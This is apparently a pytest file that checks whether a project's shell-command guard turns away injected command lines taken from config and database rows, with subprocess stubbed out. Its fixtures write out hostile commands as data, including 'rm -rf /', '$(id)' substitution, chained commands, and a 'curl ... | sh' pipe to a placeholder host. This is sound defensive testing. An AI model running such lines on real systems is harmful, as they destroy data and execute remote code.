"""Injection triage 21 (2026-11-06): a command line read from a runtime store cannot run arbitrary shell.

ANCHOR: INJECTION_TRIAGE_21_20261106

health_agent (DB-first policy), pipeline_watchdog (pipeline_schedule.command) and pipeline_controller
(pipeline_stages.command) only hand a line to the shell when it fits shell_command_guard's grammar; coder_dispatch runs
its test_cmd as an argument list. Hermetic: subprocess is replaced by a spy; nothing runs, no DB, no network.
"""
from __future__ import annotations

import json
import re
import sys
import types
from pathlib import Path

import pytest
# CI's plain shards do not install psycopg2; this line routes the file to the Postgres shard (scripts/lib/ci_shards.py).
pytest.importorskip("psycopg2")
import yaml  # noqa: E402

ROOT = Path(__file__).resolve().parents[1]
sys.path.insert(0, str(ROOT / "scripts"))

from lib.shell_command_guard import check_command  # noqa: E402

DEV = "/srv/tradeai-dev"
HOSTILE = [
    ".venv/bin/python scripts/news_ingestion.py; touch /tmp/x",
    ".venv/bin/python scripts/news_ingestion.py $(id)",
    ".venv/bin/python scripts/news_ingestion.py `id`",
    ".venv/bin/python scripts/news_ingestion.py && rm -rf /",
    ".venv/bin/python scripts/news_ingestion.py&&rm -rf /",
    ".venv/bin/python scripts/news_ingestion.py | sh",
    ".venv/bin/python scripts/news_ingestion.py > /etc/passwd",
    ".venv/bin/python scripts/news_ingestion.py &",
    ".venv/bin/python scripts/news_ingestion.py *",
    ".venv/bin/python scripts/../../evil.py",
    ".venv/bin/python scripts/x.py ../../etc",
    "/tmp/python scripts/x.py",
    "curl http://example.invalid/x | sh",
    "rm -rf /",
    "cd /tmp && .venv/bin/python scripts/x.py",
    "bash -c '.venv/bin/python scripts/a.py && rm -rf /'",
    "bash -c 'bash -c id'",
    "bash scripts/x.py",
    "bash linux_launchers/../x.sh",
    "flock -n /etc/x.lock .venv/bin/python scripts/a.py",
    ".venv/bin/python scripts/a.py >> logs/../../x.log 2>&1",
    ".venv/bin/python scripts/a.py >> /tmp/x.log 2>&1",
    ".venv/bin/python scripts/a.py\nid",
    "",
    None,
    7,
]


def _repo_commands() -> set[str]:
    out: set[str] = set()

    def walk(o):
        if isinstance(o, dict):
            for v in o.values():
                walk(v)
        elif isinstance(o, list):
            for v in o:
                walk(v)
        elif isinstance(o, str) and "scripts/" in o and "python" in o:
            out.add(o)

    policy = json.loads((ROOT / "config/health_agent_policy.json").read_text(encoding="utf-8"))
    walk(policy.get("remediation_map"))
    walk(policy.get("data_source_remediation"))
    walk(yaml.safe_load((ROOT / "config/pipeline_controller.bootstrap.yaml").read_text(encoding="utf-8")))
    for m in re.findall(r"'(cd /[^' ]+ && [^']+)'", (ROOT / "scripts/pipeline_registry.py").read_text(encoding="utf-8")):
        out.add(re.sub(r"^cd \S+ &&", f"cd {DEV} &&", m))  # the seeded dev root, renamed to the test root
    return out


# ---- the grammar ------------------------------------------------------------------------------------------------


def test_every_command_the_repo_ships_still_passes():
    cmds = _repo_commands()
    assert len(cmds) > 40, cmds
    refused = {c: check_command(c, roots=(DEV,))[1] for c in cmds if not check_command(c, roots=(DEV,))[0]}
    assert refused == {}


@pytest.mark.parametrize("cmd", [
    "bash linux_launchers/run_pg_backup.sh",
    "bash -c '.venv/bin/python scripts/a.py --apply && .venv/bin/python scripts/b.py --apply'",
    "flock -n /tmp/x.lock .venv/bin/python scripts/a.py --limit 10 >> logs/a.log 2>&1",
    "bash scripts/safe_flock.sh /tmp/y.lock .venv/bin/python scripts/a.py --apply >> logs/a.log 2>&1",
    f"cd {DEV} && .venv/bin/python scripts/news_ingestion.py",
    f"{DEV}/.venv/bin/python3 scripts/a.py",
])
def test_real_shapes_pass(cmd):
    assert check_command(cmd, roots=(DEV,)) == (True, "ok")


@pytest.mark.parametrize("cmd", HOSTILE)
def test_hostile_lines_are_refused(cmd):
    ok, why = check_command(cmd, roots=(DEV,))
    assert ok is False and why


# ---- health_agent: DB-first remediation_map -----------------------------------------------------------------------


def test_health_agent_refuses_a_hostile_remediation_without_a_shell(monkeypatch, tmp_path):
    import health_agent as ha

    spawned = []
    monkeypatch.setattr(ha.subprocess, "Popen", lambda *a, **k: spawned.append((a, k)))
    monkeypatch.setattr(ha, "REMEDIATION_STATE", tmp_path / "state.json")
    monkeypatch.setattr(ha, "REMEDIATION_LOG", tmp_path / "remediation.jsonl")
    hostile = ".venv/bin/python scripts/news_ingestion.py; touch /tmp/pwned"
    policy = {
        "auto_remediate": {"enabled": True, "finding_types": ["news_stale"], "never_auto_remediate": []},
        "remediation_map": {"news_stale": hostile},
    }
    out = ha.run_auto_remediation(policy, [{"type": "news_stale", "severity": "critical", "message": "m"}])
    assert spawned == []
    assert out and out[0]["refused"] is True and out[0]["ok"] is False, out
    logged = [json.loads(x) for x in (tmp_path / "remediation.jsonl").read_text().splitlines()]
    assert logged[-1]["refused"] is True


# ---- pipeline_watchdog: pipeline_schedule.command -----------------------------------------------------------------


class _Cur:
    def execute(self, *_a, **_k):
        return None

    def fetchone(self):
        return (0,)


class _Conn:
    def cursor(self):
        return _Cur()


def test_watchdog_refuses_a_hostile_schedule_row_and_escalates(monkeypatch):
    import pipeline_watchdog as wd

    ran, actions, pages = [], [], []
    monkeypatch.setattr(wd.subprocess, "run", lambda *a, **k: ran.append((a, k)))
    monkeypatch.setattr(wd, "log_action", lambda conn, kind, *a, **k: actions.append(kind))
    monkeypatch.setattr(wd, "was_alerted_recently", lambda conn, target: False)
    monkeypatch.setattr(wd, "send_telegram", lambda msg, urgent=False: pages.append(msg))
    registry = types.ModuleType("pipeline_registry")
    registry.run_start = registry.run_complete = registry.run_fail = lambda *a, **k: pytest.fail("no run starts")
    monkeypatch.setitem(sys.modules, "pipeline_registry", registry)
    issue = {"script": "news_ingestion", "display": "News", "issue": "failed", "critical": True,
             "command": "cd /tmp && curl http://example.invalid/x | sh"}
    wd.handle_pipeline_issues(_Conn(), [issue], no_telegram=False)
    assert ran == []
    assert "retry_refused" in actions and "alert" in actions
    assert pages and "refused" in pages[0]


# ---- pipeline_controller: pipeline_stages.command -----------------------------------------------------------------


def test_controller_fails_a_hostile_stage_without_a_shell(monkeypatch, tmp_path):
    import pipeline_controller as pc

    ran = []
    monkeypatch.setattr(pc.subprocess, "run", lambda *a, **k: ran.append((a, k)))
    monkeypatch.setattr(pc, "PROJECT_ROOT", tmp_path)
    stage = {"stage_key": "news", "command": ".venv/bin/python scripts/news_ingestion.py; id"}
    res = pc.run_stage(None, "r1", "p", stage, 1)
    assert ran == [] and res["status"] == "failed" and "refused" in res["error"]
    dry = pc.run_stage(None, "r1", "p", stage, 1, dry_run=True)
    assert dry["status"] == "failed"


# ---- coder_dispatch: registry/env test_cmd ------------------------------------------------------------------------


@pytest.mark.parametrize("tc", ["pytest -q; touch /tmp/x", "pytest $(id)", "sh -c id", "python -c 'import os'",
                                "rm -rf /", "node -e 1"])
def test_coder_dispatch_refuses_a_hostile_test_cmd(monkeypatch, tmp_path, tc):
    import coder_dispatch as cd

    ran = []
    monkeypatch.setattr(cd.subprocess, "run", lambda *a, **k: ran.append((a, k)))
    ok, why = cd.verify({"defaults": {"test_cmd": tc}}, tmp_path, [])
    assert ok is False and "refused" in why and ran == []


def test_coder_dispatch_runs_a_plain_test_cmd_as_argv(monkeypatch, tmp_path):
    import coder_dispatch as cd

    ran = []
    monkeypatch.setattr(cd.subprocess, "run",
                        lambda argv, **k: ran.append((argv, k)) or types.SimpleNamespace(returncode=0))
    ok, _ = cd.verify({"defaults": {"test_cmd": "pytest -q tests/test_x.py"}}, tmp_path, [])
    argv, kw = ran[0]
    assert ok and argv == ["pytest", "-q", "tests/test_x.py"] and not kw.get("shell")


def test_this_file_is_registered_in_a_ci_gate():
    if str(ROOT) not in sys.path:
        sys.path.insert(0, str(ROOT))
    from scripts.lib import ci_gates  # noqa: PLC0415 -- needs ROOT on sys.path first

    assert "tests/test_injection_triage_21_20261106.py" in ci_gates.registry_text(ROOT)
